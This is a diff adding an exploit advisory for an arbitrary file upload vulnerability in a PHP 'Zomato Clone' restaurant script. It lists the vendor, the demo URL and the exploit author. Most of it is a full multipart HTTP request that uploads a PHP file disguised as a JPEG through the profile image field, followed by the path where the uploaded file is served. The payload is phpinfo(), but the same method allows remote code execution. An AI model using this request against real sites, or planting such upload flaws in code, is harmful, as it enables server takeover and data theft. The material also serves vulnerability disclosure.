@@ -1,0 +1,96 @@
+# # # # # 
+# Zomato Clone  - Arbitrary File Upload
+# Date: 16.01.2018
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.exclusivescript.com/product/099S4111872/php-scripts/zomato-clone-script
+# Demo: http://jhinstitute.com/demo/foodpanda/
+# Version: N/A
+# Category: Webapps
+# Tested on: Windows 10
+# Exploit Author: Tauco
+
+Testing for malicious files verifies that the application/system is able to correctly protect against attackers uploading malicious files. Vulnerabilities related to the uploading of malicious files is unique in that these “malicious” files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.
+
+Proof of concept:
+===================================================================================
+POST /demo/foodpanda/myacount.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+
+-----------------------------41184676334
+Content-Disposition: form-data; name="fname"
+
+test
+-----------------------------41184676334
+Content-Disposition: form-data; name="lname"
+
+test
+-----------------------------41184676334
+Content-Disposition: form-data; name="email"
+
+test@test.com
+-----------------------------41184676334
+Content-Disposition: form-data; name="phone"
+
+123
+-----------------------------41184676334
+Content-Disposition: form-data; name="image"; filename="info.php.jpg" (change extension to .php)
+Content-Type: image/jpeg
+
+<?php
+phpinfo();
+?>
+-----------------------------41184676334
+Content-Disposition: form-data; name="addr1"
+
+test
+-----------------------------41184676334
+Content-Disposition: form-data; name="addr2"
+
+test
+-----------------------------41184676334
+Content-Disposition: form-data; name="post"
+
+
+-----------------------------41184676334
+Content-Disposition: form-data; name="country"
+
+1
+-----------------------------41184676334
+Content-Disposition: form-data; name="state"
+
+3945
+-----------------------------41184676334
+Content-Disposition: form-data; name="city"
+
+16315
+-----------------------------41184676334
+Content-Disposition: form-data; name="location"
+
+test
+-----------------------------41184676334
+Content-Disposition: form-data; name="update"
+
+Upload
+-----------------------------41184676334--
+
+
+===================================================================================
+
+Open file location : /demo/foodpanda/photo/mid/[...php]
+
+
+Description:
+==========================================================
+ 
+ 
+Request Method(s):              [+]  POST & GET
+ 
+ 
+Vulnerable Product:             [+]  Zomato Clone Script
+ 
+ 
+Vulnerable Parameter(s):        [+]  filename
